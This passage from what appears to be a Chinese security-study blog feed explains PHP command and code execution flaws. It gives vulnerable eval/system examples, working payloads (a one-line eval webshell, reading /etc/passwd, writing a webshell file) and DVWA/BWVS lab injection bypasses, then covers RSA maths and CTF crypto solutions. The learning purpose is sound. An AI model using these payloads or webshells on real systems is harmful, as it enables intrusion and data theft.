此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。<br>资料参考：<a href="http://cn.php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://cn.php.net/manual/zh/function.escapeshellcmd.php</a></p><h5 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h5><p><strong>代码执行漏洞成因：</strong><br>应用程序在调用一些能够将字符串转换为代码的函数（如PHP中的eval）时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞。大部分都是根据源代码判断代码执行漏洞。<br><strong>代码执行漏洞：</strong><br>靠执行脚本代码调用操作系统命令<br><strong>代码执行漏洞原理：</strong><br>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。<br><strong>代码执行相关函数：</strong></p><ul><li>PHP: eval、assert、preg_replace()、+/e模式（PHP版本&lt;5.5.0）</li><li>Javascript: eval</li><li>Vbscript：Execute、Eval</li><li>Python: exec</li></ul><p>Java: Java中没有php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞。</p><p><strong>代码执行漏洞的案例：</strong></p><ul><li>可控点为待执行的程序。</li></ul><pre><code class="php">&lt;?php$data = $_GET[‘data’];eval (“\$ret = $data;”);echo $ret;?&gt;</code></pre><p>使用：直接传入我们想要执行的PHP代码。</p><ul><li><p>可控点某函数的参数值且被单引号包裹。</p><pre><code class="php">&lt;?php$data = $_GET[‘data’];eval (“\$ret = strtolower(‘$data’);”);echo $ret;?&gt;</code></pre><p>使用：必须先闭合单引号。<br>Pl：’);所需函数;//</p></li><li><p>可控点某函数的参数值且被双引号包裹。</p><pre><code class="php">&lt;?php$data = $_GET[‘data’];eval (“\$ret = strtolower(“\’’$_data\”);”);echo $ret;?&gt;</code></pre><p>Pl:   {${所需函数}}<br>“);所需函数;//<br>在PHP中，双引号里面如果包含有变量，PHP解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。</p></li><li><p>preg_replace()+/e(PHP版本&lt;5.5.0)</p><pre><code class="php">&lt;?php$data = $_GET[‘data’];preg_repalce(‘/&lt;data&gt;(.*)&lt;\ /data&gt;/e’, ’$ret=”\\1”;’ $data);echo $ret;?&gt;</code></pre><p> {${所需函数}}<br><em>/e 修正符</em><br>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 </p></li></ul><p><strong>代码执行漏洞利用：</strong><br><em>1.一句话木马</em></p><pre><code class="php">${@eval($_POST[1])}</code></pre><p><em>2.获取当前工作路径</em></p><pre><code class="php">${exit(print(getcwd()))}</code></pre><p>使用菜刀<br><em>3.读文件</em></p><pre><code class="php">${exit(var_dump(file_get_contents($_POST[f])))}f=/etc/passwd</code></pre><p>使用post提交数值 f=/etc/passwd<br><em>4.写webshell</em></p><pre><code class="php">${exit(var_dump(file_put_contents($_POST[f], $_POST[d])))}f=1.php&amp;d=1111111</code></pre><p>同样使用post<br><strong>代码执行漏洞修复方案：</strong></p><ul><li>对于eval()函数一定要保证用户不能轻易接触eval参数或者用正则严格判断输入的数据格式。</li><li>对于字符串一定要使用单引号包裹可控代码，并且插入前进行addslashes</li><li>对于preg_replace放弃使用e修饰符.如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹。</li></ul><h4 id="基础环境搭建"><a href="#基础环境搭建" class="headerlink" title="基础环境搭建"></a>基础环境搭建</h4><p>搭建使用Web服务器环境(Apache+PHP+MySQL、我用的phpstudy集成环境)<br><strong>命令执行环境</strong><br>新建一个<code>commnd.php</code>文件，其中输入代码：</p><pre><code class="php">&lt;?php$a=$_GET[&#39;cmd&#39;];if ($a){    system(&quot;$a&quot;);}?&gt;</code></pre><p>测试一下<br><img src="http://img-blog.csdnimg.cn/2019080800591673.jpg" alt="在这里插入图片描述"><br>报错是因为没有get传参。<br>get传参测试是否成功(如果显示编码有问题，可以设置编码)<br><img src="http://img-blog.csdnimg.cn/20190808005517371.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这种操作相当于在命令行（cmd）下进行ipconfig的查询。<br><strong>代码执行环境</strong><br>新建<code>code.php</code>,输入代码：</p><pre><code class="php">&lt;?php    eval($_REQUEST[&#39;code&#39;]);?&gt;</code></pre><p>在浏览器中打开，传参(get或post都行)，参数值我选择<code>phpinfo();</code><br><img src="http://img-blog.csdnimg.cn/20190808011215923.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>效果和查看phpinfo.php是一样的。</p><h3 id="DVWA漏洞靶场-Command-Injection-命令执行"><a href="#DVWA漏洞靶场-Command-Injection-命令执行" class="headerlink" title="DVWA漏洞靶场-Command Injection(命令执行)"></a>DVWA漏洞靶场-Command Injection(命令执行)</h3><h4 id="1、low-级别"><a href="#1、low-级别" class="headerlink" title="1、low 级别"></a>1、low 级别</h4><pre><code class="php">127.0.0.1 &amp; ipconfig</code></pre><p>没有任何过滤，执行成功<br><img src="http://img-blog.csdnimg.cn/20190808191857269.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>stristr(string,search,before_search)</strong><br>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。<br><strong>php_uname(mode)</strong><br>这个函数会返回运行php的操作系统的相关描述，参数mode可取值<br>”a” （此为默认，包含序列”s n r v m”里的所有模式）<br>”s ”（返回操作系统名称）<br>”n”（返回主机名）<br>”r”（返回版本名称）<br>”v”（返回版本信息）<br> ”m”（返回机器类型）<br>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p><h4 id="2、medium-级别"><a href="#2、medium-级别" class="headerlink" title="2、medium 级别"></a>2、medium 级别</h4><p>查看源码<br><img src="http://img-blog.csdnimg.cn/20190808192048916.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置了黑名单，对 <code>&amp;&amp;</code> <code>；</code> 进行了过滤，替换成空<br>单 <code>&amp;</code>  或者 <code>||</code> 可绕过，即：</p><pre><code class="php">127.0.0.1 &amp; ipconfig</code></pre><p>或</p><pre><code class="php">127.0.0.1 || ipconfig</code></pre><h4 id="3、high-级别"><a href="#3、high-级别" class="headerlink" title="3、high 级别"></a>3、high 级别</h4><p>查看源码<br><img src="http://img-blog.csdnimg.cn/20190808192443905.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>更加严格过滤，对黑名单中所有字符进行替换，<code>&amp;&amp;</code> 会被替换两次<br>过滤了 <code>| + 空格</code>，使用无空格<code>|</code>绕过，即可执行成功。即：</p><pre><code class="php">127.0.0.1|ipconfig</code></pre><h4 id="4、impose-级别"><a href="#4、impose-级别" class="headerlink" title="4、impose 级别"></a>4、impose 级别</h4><p>查看源码<br><img src="http://img-blog.csdnimg.cn/20190808224353290.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>stripslashes(string)</strong><br>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。<br><strong>explode(separator,string,limit)</strong><br>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。<br><strong>is_numeric(string)</strong><br>检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p><p>限制IP格式，这就是所谓的白名单，可以有效的防止命令注入。不推荐黑名单，应该可以通过双引号，略过黑名单。linux下还支持单引号<br><img src="http://img-blog.csdnimg.cn/20190808225745448.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="BWVS漏洞靶场-代码执行"><a href="#BWVS漏洞靶场-代码执行" class="headerlink" title="BWVS漏洞靶场-代码执行"></a>BWVS漏洞靶场-代码执行</h3><h4 id="1、一句话木马"><a href="#1、一句话木马" class="headerlink" title="1、一句话木马"></a>1、一句话木马</h4><pre><code class="php">http://192.168.204.128/BWVS//bug/code_exec/code.php?code=${@eval($_POST[&#39;a&#39;])}&amp;submit=submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20190808222444406.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2、获取当前工作路径"><a href="#2、获取当前工作路径" class="headerlink" title="2、获取当前工作路径"></a>2、获取当前工作路径</h4><pre><code class="php">http://192.168.204.128/BWVS//bug/code_exec/code.php?code= ${exit(print(getcwd()))}&amp;submit=submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20190808222810486.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="3、读文件"><a href="#3、读文件" class="headerlink" title="3、读文件"></a>3、读文件</h4><pre><code class="php">${exit(var_dump(file_get_contents($_POST[f])))}f=/etc/passwd</code></pre><p><img src="http://img-blog.csdnimg.cn/2019080822300789.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="4、写webshell"><a href="#4、写webshell" class="headerlink" title="4、写webshell"></a>4、写webshell</h4><pre><code class="php">${exit(var_dump(file_put_contents($_POST[f], $_POST[d])))}f=webshell.php&amp;d=&lt;?php @eval($_POST[&#39;abc&#39;]); ?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/2019080822314446.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试是否上传成功，上传成功<br><img src="http://img-blog.csdnimg.cn/2019080822315683.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考：<br><a href="http://www.cnblogs.com/ktfsong/p/11267432.html" target="_blank" rel="noopener">DVWA漏洞靶场-命令执行(Command Injection)</a><br><a href="http://www.jianshu.com/p/2e7363f3d3ea" target="_blank" rel="noopener">代码执行漏洞</a><br><a href="http://www.cnblogs.com/angly/p/3157736.html" target="_blank" rel="noopener">PHP安全之慎用preg_replace的/e修饰符</a><br>《Web安全攻防》<br><a href="http://www.cnblogs.com/drkang/p/8688481.html" target="_blank" rel="noopener">命令执行、代码执行漏洞</a></p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>通过学习命令执行和代码执行。又收获了好多知识，继续努力！！！<br>小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 命令注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> 代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-RSA加密</title>
      <link href="/2019/08/06/Crypto-RSA%E5%8A%A0%E5%AF%86/"/>
      <url>/2019/08/06/Crypto-RSA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近学习了RSA加密原理，并且做了些有关RSA的Crypto题。收获很大，总结了一下</p><h3 id="一、对称加密和非对称加密"><a href="#一、对称加密和非对称加密" class="headerlink" title="一、对称加密和非对称加密"></a>一、对称加密和非对称加密</h3><p><strong>对称加密算法</strong></p><pre><code>（1）甲方选择某一种加密规则，对信息进行加密；（2）乙方使用同一种规则，对信息进行解密。</code></pre><p><img src="http://img-blog.csdnimg.cn/2019081217321257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最大弱点：甲方必须把加密规则告诉乙方，否则无法解密。保存和传递密钥，就成了最头疼的问题。<br><strong>非对称加密算法</strong></p><pre><code>（1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。（2）甲方获取乙方的公钥，然后用它对信息加密。（3）乙方得到加密后的信息，用私钥解密。</code></pre><p><img src="http://img-blog.csdnimg.cn/20190812173247722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>公钥加密的信息只有私钥解得开，那么只要私钥不泄漏，通信就是安全的</p><h3 id="二、RSA基本介绍"><a href="#二、RSA基本介绍" class="headerlink" title="二、RSA基本介绍"></a>二、RSA基本介绍</h3><p><strong>介绍</strong></p><ul><li>RSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。</li><li>对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。现在只有短的RSA钥匙才可能被强力方式解破。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。</li></ul><p> <strong>RSA签名验签</strong><br> 使用私钥将明文进行签名生成密文串与明文一起传输。对方收到数据后使用公钥和密文串进行验签。如果验签通过就说明就说明第一数据没有被修改过；第二这些数据一定是持有私钥的人发送的，因为私钥只有自己持有，起到防抵赖的作用。</p><h3 id="三、RSA数学知识"><a href="#三、RSA数学知识" class="headerlink" title="三、RSA数学知识"></a>三、RSA数学知识</h3><h4 id="1、互质关系"><a href="#1、互质关系" class="headerlink" title="1、互质关系"></a>1、互质关系</h4><p>如果两个正整数，除了1之外没有其他公因子，我们称这两个数是互质关系。不是质数也可以构成互质关系。<br>关于互质关系，有以下结论：</p><ul><li>任意两个质数构成互质关系，比如13和61.</li><li>一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10.</li><li>如果两个数中，较大的那个数是质数，则两者构成互质关系，比如97和57.</li><li>1和任意一个自然数都是互质关系。</li><li>p是大于1的整数，则p和p-1构成互质关系，比如57和56.</li><li>p是大于1的奇数，则p和p-2构成互质关系，比如17和15.</li></ul><h4 id="2、欧拉函数"><a href="#2、欧拉函数" class="headerlink" title="2、欧拉函数"></a>2、欧拉函数</h4><p>任意给定正整数n,计算在小于等于n的正整数之中，有多少个与n构成互质关系。计算这个值的方法叫做欧拉函数。以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。</p><ol><li><p>如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。</p></li><li><p>如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。</p></li><li><p>如果n是质数的某一个次方，即 n = p^k (p为质数，k为大于等于1的整数)，则<br><img src="http://img-blog.csdnimg.cn/20190805175303621.png" alt="在这里插入图片描述"><br>比如 φ(8) = φ(2^3) =2^3 - 2^2 = 8 -4 = 4。<br>这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p^(k-1) 个，即1×p、2×p、3×p、…、p^(k-1)×p，把它们去除，剩下的就是与n互质的数。<br>上面的式子还可以写成下面的形式：<br><img src="http://img-blog.csdnimg.cn/20190805175713420.png" alt="在这里插入图片描述"><br>可以看出，上面的第二种情况是 k=1 时的特例。</p></li><li><p>如果n可以分解成两个互质的整数之积，<br>n = p1 × p2<br>则<br>φ(n) = φ(p1p2) = φ(p1)φ(p2)<br>即积的欧拉函数等于各个因子的欧拉函数之积。比如，φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。</p></li><li><p>因为任意一个大于1的正整数，都可以写成一系列质数的积。<br><img src="http://img-blog.csdnimg.cn/20190805180111813.png" alt="在这里插入图片描述"><br>根据第4条的结论，得到<br><img src="http://img-blog.csdnimg.cn/20190805180151770.png" alt="在这里插入图片描述"><br>再根据第3条的结论，得到<br><img src="http://img-blog.csdnimg.cn/20190805180433425.png" alt="在这里插入图片描述"><br>也就等于<br><img src="http://img-blog.csdnimg.cn/20190805180502692.png" alt="在这里插入图片描述"><br>这就是欧拉函数的通用计算公式。比如，1323的欧拉函数，计算过程如下：<br>φ(1323)=φ(3^2 * 7^2)=1323(1-1/3)(1-1/7)=756</p></li></ol><h4 id="3、欧拉定理"><a href="#3、欧拉定理" class="headerlink" title="3、欧拉定理"></a>3、欧拉定理</h4><p>如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：<br><img src="http://img-blog.csdnimg.cn/20190805181111317.png" alt="在这里插入图片描述"><br>也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。</p><p>如果正整数a与质数p互质，应为φ(p)=p-1，所以欧拉函数可写成：<br><img src="http://img-blog.csdnimg.cn/20190805181541898.png" alt="在这里插入图片描述"><br>这是著名的费马小定理。它是欧拉定理的特例。欧拉定理是RSA算法的核心。</p><h4 id="4、模反元素"><a href="#4、模反元素" class="headerlink" title="4、模反元素"></a>4、模反元素</h4><p>如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除。<br><img src="http://img-blog.csdnimg.cn/20190805182259251.png" alt="在这里插入图片描述"><br>比如：3和11互质，那么3的模反元素是4，应为3*4-1 可以被11整除。4加减11的整数倍数都是3的模反元素。<br>欧拉定理可以用来证明模反元素必然存在：<br><img src="http://img-blog.csdnimg.cn/20190805182339815.png" alt="在这里插入图片描述"><br>a的φ(n)-1次方，就是a的模反元素</p><h3 id="四、RSA算法"><a href="#四、RSA算法" class="headerlink" title="四、RSA算法"></a>四、RSA算法</h3><p><img src="http://img-blog.csdnimg.cn/2019081217333227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="1、公钥和私钥的生成"><a href="#1、公钥和私钥的生成" class="headerlink" title="1、公钥和私钥的生成"></a>1、公钥和私钥的生成</h4><p>RSA算法之一种非对称加密算法。具体的加密工程如下：<br>使用A和他的小伙伴B来举例子。<br>假设A想通过一个不可靠的媒体接受B的一条私人消息，他可以用下面的方式产生一个公钥和私钥。</p><pre><code>1. 随意选择两个大的质数p和q，p不等于q，计算N = pq.2. 根据欧拉函数，求得r=φ(N)=φ(p)φ(q)=(p-1)(q-1)。3. 选择一个小于r的整数e,是e与r互质。并求得e关于r的模反元素，命名为d。(求d令ed≡1(mod r))。(模反元素存在，当且仅当e与r互质）4. 将p和q的记录销毁。</code></pre><p>其中(N，e)是公钥，(N，d)是私钥。</p><p><strong>例子：</strong></p><ol><li>A随机选两个不相等的质数61和53，并计算两数的积N=61*53=3233，N的长度就是密钥长度。3233的二进制是110010100001，一共12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，总要的场合是2048位。</li><li>计算N的欧拉函数。 φ(N)=(p-1)(q-1)=60*52=3120.</li><li>A 在1到3120上随机选择了一个随机数e=17。</li><li>计算e对φ(N)的模反元素d，ed ≡ 1 (mod φ(N))等价于ed-1=kφ(N)。<br>找到模反元素d，实质上就是对这个二元一次方程求解：17x+3120y=1。<br>用扩展欧几里得算法求解。可以算出一组解(x,y)=(2753,-15)，即d=2753。</li></ol><p>其中N=3233,e=17,d=2753。所以公钥就是(N,e)=(3233,17)，私钥(N,d)=(3233,2753)。实际应用中公钥和私钥都是采用ASN.1格式表达的。</p><h4 id="2、可靠性"><a href="#2、可靠性" class="headerlink" title="2、可靠性"></a>2、可靠性</h4><p>密钥生成步骤，一共出现六个数字：p、q、N、φ(N)、e、d<br>一旦d泄露，就等于私钥泄露。</p><pre><code>ed ≡ 1(mod φ(N))。只有知道e和φ(N)，才能算出dφ(N)=(p-1)(q-1)。只有知道p和q,才能算出φ(N）N=pq,只有将n分解才能算出p和q</code></pre><p>只有将n质因数分解，才能算出d。也就意味着私钥破译。但大整数的质因数分解是非常困难的。</p><h4 id="3、加密和解密"><a href="#3、加密和解密" class="headerlink" title="3、加密和解密"></a>3、加密和解密</h4><h5 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h5><p>加密要用到公钥(N,e)。<br>假设B要向A发送加密信息m，B就要用A的公钥(N,e)对m进行加密。<br>但m必须是整数(字符串可以取ascii值或unicode值)，且m必须小于n。<br>加密就是计算下式的c。</p><pre><code>m^e ≡ c (mod n)</code></pre><p>假设m=65,A的公钥(3233,17),所以等式如下：</p><pre><code>65^17≡2790（mod 3233）</code></pre><p>所以c等于2790，B就把2790发给A。</p><h5 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h5><p>A收到B发来的c(也就是2790)后，就用自己的私钥(3233,2753)进行解密。</p><pre><code>c^d ≡ m (mod n)</code></pre><p>也就是c的d次方除以n的余数就是m。<br>2790^2753 ≡ 65 (mod 3233)<br>因此得到原文65。</p><h5 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h5><p>证明为什么用私钥就能解密。就是要证明这个式子：</p><pre><code>c^d ≡ m (mod n)</code></pre><p>因为加密规则是：</p><pre><code>ｍ^e ≡ c (mod n)</code></pre><p>于是，c可以写成：</p><pre><code>c = m^e - kn</code></pre><p>将c代入要我们要证明的那个解密规则：</p><pre><code>(m^e - kn)^d ≡ m (mod n)</code></pre><p>等同于求证：</p><pre><code>m^ed ≡ m (mod n)因为:ed ≡ 1 (mod φ(n))所以:ed = hφ(n)+1将ed代入:m^(hφ(n)+1) ≡ m (mod n)</code></pre><p>接下来，分成两种情况证明上面这个式子。</p><ol><li>当m与n互质<pre><code>根据欧拉定理，此时m^φ(n) ≡ 1 (mod n)得到:(m^φ(n))^h × m ≡ m (mod n)由此原始得到证明。</code></pre></li><li>当m与n不是互质时</li></ol><p>此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。<br>以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：</p><pre><code>(kp)^q-1 ≡ 1 (mod q)进一步得到：[(kp)^(q-1)]^(h(p-1))× kp ≡ kp (mod q)即：(kp)^ed ≡ kp (mod q)改写成：(kp)^ed = tq + kp上式t必然能被p整除，即t=t&#39;p(kp)^ed = t&#39;pq + kp因为m=kp,n=pq,所以：m^ed ≡ m (mod n)</code></pre><p>证明完毕。</p><p>参考博客：<br><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html" target="_blank" rel="noopener">RSA算法原理(一)</a><br><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="noopener">RSA算法原理(二)</a></p><h3 id="五、RSA实战"><a href="#五、RSA实战" class="headerlink" title="五、RSA实战"></a>五、RSA实战</h3><h4 id="Crypto1：easy-RSA"><a href="#Crypto1：easy-RSA" class="headerlink" title="Crypto1：easy_RSA"></a>Crypto1：easy_RSA</h4><p><img src="http://img-blog.csdnimg.cn/20190805193549595.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示是RSA，下载题目查看<br><img src="http://img-blog.csdnimg.cn/2019080519394156.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由题目可知，只要计算出私钥d即可<br>φ(N)=φ(p)φ(q)=(p-1)(q-1)<br>ed ≡ 1 (mod φ(N))<br>所以ed=φ(N)+1，即17d=(p-1)(q-1)+1=473398607160*4511490+1<br>先计算欧拉函数φ(N)<br><img src="http://img-blog.csdnimg.cn/20190806091858791.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再加1<br><img src="http://img-blog.csdnimg.cn/20190806091914135.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后除以17即是私钥d，也即是flag内容，加上flag{}提交</p><p><img src="http://img-blog.csdnimg.cn/20190806092023507.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>百度发现一个脚本，不过要安装gmpy2库</p><pre><code class="python">#!/usr/bin/env python3# -*- coding:utf-8 -*-import gmpy2p = 473398607161q = 4511491e = 17s = (p-1)*(q-1)d = gmpy2.invert(e,s)print(&#39;flag is :&#39;,d)</code></pre><p><img src="http://img-blog.csdnimg.cn/20190806110124512.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Crypto2：Normal-RSA"><a href="#Crypto2：Normal-RSA" class="headerlink" title="Crypto2：Normal_RSA"></a>Crypto2：Normal_RSA</h4><p><img src="http://img-blog.csdnimg.cn/20190806102745387.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载题目，得到flag.enc和pubkey.pem。根据题目提示肯定是需要用到工具。<a href="http://cloud.tencent.com/developer/article/1070314" target="_blank" rel="noopener">RSA工具及使用</a><br>这道题目主要需要用到RSAtools和OpenSSL<br><strong>1、用OpenSSL得到N</strong><br>命令：</p><pre><code>openssl rsa -pubin -text -modulus -in public.pem</code></pre><p>N=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD<br><strong>Modulus 是N的值，Exponent是e的值。</strong><br><img src="http://img-blog.csdnimg.cn/20190806111621130.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>16进制转10进制<br><img src="http://img-blog.csdnimg.cn/20190806112854488.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2、分解N的值，得到p、q</strong><br><a href="http://www.factordb.com/" target="_blank" rel="noopener">在线大数分解</a><br><img 